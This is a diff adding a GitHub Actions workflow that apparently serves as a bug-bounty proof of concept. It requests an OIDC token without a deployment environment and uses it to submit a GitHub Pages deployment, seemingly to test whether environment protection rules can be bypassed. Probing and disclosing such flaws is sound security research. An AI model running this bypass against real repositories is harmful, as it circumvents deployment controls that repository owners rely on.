@@ -1,0 +1,63 @@
+name: BBP Pages deployment without target environment
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+  pages: write
+
+jobs:
+  deploy-without-environment:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Request target-repository OIDC token without an environment
+        env:
+          OIDC_AUDIENCE: https://github.com/pirikara-bounty-organization-2
+        run: |
+          curl --silent --show-error --fail \
+            --header "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${OIDC_AUDIENCE}" \
+            --output oidc-response.json
+
+          node - <<'NODE'
+          const fs = require('fs');
+          const token = JSON.parse(fs.readFileSync('oidc-response.json', 'utf8')).value;
+          const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
+          const selected = {};
+          for (const key of ['aud', 'repository', 'repository_id', 'ref', 'sha', 'run_id', 'environment', 'environment_node_id', 'actor', 'iat', 'exp']) {
+            selected[key] = Object.hasOwn(claims, key) ? claims[key] : null;
+          }
+          console.log(JSON.stringify(selected, null, 2));
+          NODE
+
+      - name: Submit Pages deployment using the environment-less token
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          token="$(jq -r .value oidc-response.json)"
+          jq -n \
+            --argjson artifact_id 13159723104 \
+            --arg environment github-pages \
+            --arg pages_build_version 725a653214f37732abb62fd596f90a2435e44184 \
+            --arg oidc_token "$token" \
+            '{artifact_id: $artifact_id, environment: $environment, pages_build_version: $pages_build_version, oidc_token: $oidc_token}' \
+            > request.json
+
+          status="$(curl --silent --show-error \
+            --request POST \
+            --header "Accept: application/vnd.github+json" \
+            --header "Authorization: Bearer $GH_TOKEN" \
+            --header "X-GitHub-Api-Version: 2022-11-28" \
+            --dump-header response.headers \
+            --output response.json \
+            --write-out '%{http_code}' \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/pages/deployments" \
+            --data @request.json)"
+
+          rm request.json oidc-response.json
+          printf 'HTTP status: %s\n' "$status"
+          grep -i '^x-github-request-id:' response.headers || true
+          jq '{id, page_url, status_url, message}' response.json
+          test "$status" = "200"
